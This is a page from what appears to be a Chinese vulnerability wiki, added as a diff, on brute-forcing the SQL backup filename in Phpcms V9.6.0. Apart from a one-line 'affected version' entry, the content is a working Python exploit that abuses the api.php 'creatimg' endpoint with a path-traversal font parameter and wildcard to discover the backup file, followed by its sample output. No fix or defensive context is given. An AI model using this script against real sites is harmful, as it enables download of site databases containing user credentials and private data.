@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Phpcms/Phpcms%20V9.6.0%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E7%88%86%E7%A0%B4/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Phpcms V9.6.0 数据库备份爆破 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Phpcms V9.6.0 \u6570\u636e\u5e93\u5907\u4efd\u7206\u7834", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpcms%20V9.6.3%20install.php%20%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpcms%20V9.6.3%20install.php%20%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/" class="btn btn-xs btn-link">
+        Phpcms V9.6.3 install.php 没有即使删除导致的getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Phpcms%20V9.6.0%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Phpcms%20V9.6.0%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Phpcms V9.6.0 任意密码重置漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="phpcms-v960">Phpcms V9.6.0 数据库备份爆破<a class="headerlink" href="#phpcms-v960" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Phpcms V9.6.0</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># coding=utf-8</span>
+<span class="sd">&#39;&#39;&#39;/*</span>
+<span class="sd">    * author = Mochazz</span>
+<span class="sd">    * team   = 红日安全团队</span>
+<span class="sd">    * env    = pyton3</span>
+<span class="sd">    *</span>
+<span class="sd">    */</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">itertools</span>
+<span class="n">characters</span> <span class="o">=</span> <span class="s2">&quot;abcdefghjklmnopqrstuvwxyz0123456789_!#&quot;</span>
+<span class="n">backup_sql</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/</span><span class="si">{location}</span><span class="s2">&lt;&lt;&quot;</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://www.0-sec.org&quot;</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
+        <span class="k">break</span>
+    <span class="k">for</span> <span class="n">pre</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">characters</span><span class="p">,</span> <span class="n">num</span><span class="p">):</span>
+        <span class="n">pre</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">pre</span><span class="p">))</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">location</span><span class="o">=</span><span class="n">pre</span><span class="p">)</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s2">&quot;PNG&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">flag</span> <span class="o">=</span> <span class="mi">1</span>
+            <span class="n">backup_sql</span> <span class="o">=</span> <span class="n">pre</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/</span><span class="si">{location}</span><span class="s2">&lt;&lt;&quot;</span>
+            <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/</span><span class="si">{location}</span><span class="s2">&lt;&lt;&quot;</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] 前缀为：&quot;</span><span class="p">,</span> <span class="n">backup_sql</span><span class="p">)</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
+        <span class="k">break</span>
+    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="n">characters</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+            <span class="n">flag</span> <span class="o">=</span> <span class="mi">1</span>
+            <span class="k">break</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">location</span><span class="o">=</span><span class="n">backup_sql</span><span class="o">+</span><span class="n">ch</span><span class="p">)</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s2">&quot;PNG&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">backup_sql</span> <span class="o">+=</span> <span class="n">ch</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] &quot;</span><span class="p">,</span> <span class="n">backup_sql</span><span class="p">)</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/</span><span class="si">{location}</span><span class="s2">&lt;&lt;&quot;</span>
+            <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/</span><span class="si">{location}</span><span class="s2">&lt;&lt;&quot;</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;备份sql文件地址为：&quot;</span><span class="p">,</span> <span class="n">backup_sql</span><span class="o">+</span><span class="s2">&quot;.sql&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>结果为：</p>
+<div class="codehilite"><pre><span></span><code>C:\Users\dell\Desktop&gt;python Zxc.py
+[+] 前缀为： 1
+[+]  12
+[+]  123
+[+]  1231
+[+]  12312
+[+]  123123
+[+]  1231231
+[+]  12312312
+[+]  123123123
+备份sql文件地址为： 123123123.sql
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpcms%20V9.6.3%20install.php%20%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpcms%20V9.6.3%20install.php%20%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/" class="btn btn-xs btn-link">
+        Phpcms V9.6.3 install.php 没有即使删除导致的getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Phpcms%20V9.6.0%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Phpcms%20V9.6.0%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Phpcms V9.6.0 任意密码重置漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
